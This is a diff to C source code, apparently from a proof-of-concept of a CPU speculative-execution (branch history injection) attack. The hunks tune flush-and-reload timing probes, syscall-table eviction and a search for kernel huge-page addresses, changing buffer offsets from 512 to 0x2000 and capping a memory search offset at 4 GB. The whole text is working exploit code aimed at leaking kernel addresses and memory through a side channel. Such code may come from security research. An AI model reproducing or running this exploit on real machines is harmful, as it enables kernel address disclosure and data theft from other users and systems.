@@ -61,7 +61,7 @@ __always_inline static uint8_t * collide_to_syscalls(struct config * cfg, uint64
     for(int iter=0; iter<iterations; iter++) {
 
         for (int i = 0; i < NUMBER_OF_HUGE_PAGES; i++) {
-            asm volatile("clflush (%0)\n"::"r"(huge_pages[i] + 512));
+            asm volatile("clflush (%0)\n"::"r"(huge_pages[i] + 0x2000));
         }
 
         asm volatile("mfence");
@@ -78,17 +78,17 @@ __always_inline static uint8_t * collide_to_syscalls(struct config * cfg, uint64
 
         evict_sys_call_table();
 
-        fill_bhb_fill_regs(cfg->history, VICTIM_SYSCALL, cfg->fr_buf_kern);
+        fill_bhb_fill_regs(cfg->history, VICTIM_SYSCALL, cfg->fr_buf_kern + 0x2000);
 
         asm volatile("mfence");
 
-        start = (void **) (*(huge_pages) + 512);
+        start = (void **) (*(huge_pages));
         reload_addr = start;
         int idx = 0;
 
         // This prevents the prefetcher for touching our reloadbuffer
         do {
-            if(load_time(reload_addr) < THR) {
+            if(load_time((uint8_t *) (reload_addr) + 0x2000) < THR) {
                 return huge_pages[idx];
             }
 		    reload_addr = *reload_addr;
@@ -130,6 +130,10 @@ int find_hp_kern_address(struct config * cfg, uint64_t only_honey_pages) {
 
     if (mem_total > (8LU * (1LU << 30))) {
         offset = (mem_total / 10) & ~(SEARCH_ALIGNMENT - 1);
+        // never more than 4 GB
+        if (offset > 4LU * (1LU << 30)) {
+            offset = 4LU * (1LU << 30) & ~(SEARCH_ALIGNMENT - 1);
+        }
     } else {
         SEARCH_ALIGNMENT = 1LU << 22;
         NUMBER_OF_HUGE_PAGES = DEFAULT_NUMBER_OF_HUGE_PAGES / 5;
@@ -152,7 +156,7 @@ int find_hp_kern_address(struct config * cfg, uint64_t only_honey_pages) {
     }
 
     for (int i = 0; i < NUMBER_OF_HUGE_PAGES; i++) {
-        *(uint8_t **)(huge_pages[i] + 512) = huge_pages[(i + 1) % NUMBER_OF_HUGE_PAGES] + 512;
+        *(uint8_t **)(huge_pages[i]) = huge_pages[(i + 1) % NUMBER_OF_HUGE_PAGES];
     }
 
     if (only_honey_pages) {
@@ -188,7 +192,7 @@ int find_hp_kern_address(struct config * cfg, uint64_t only_honey_pages) {
             fflush(stdout);
         }
 
-        cfg->fr_buf_kern = huge_page_kern + 512;
+        cfg->fr_buf_kern = huge_page_kern;
 
 
         huge_page_user = reload_any_huge_page(cfg, open_fds, n_fd, huge_pages);
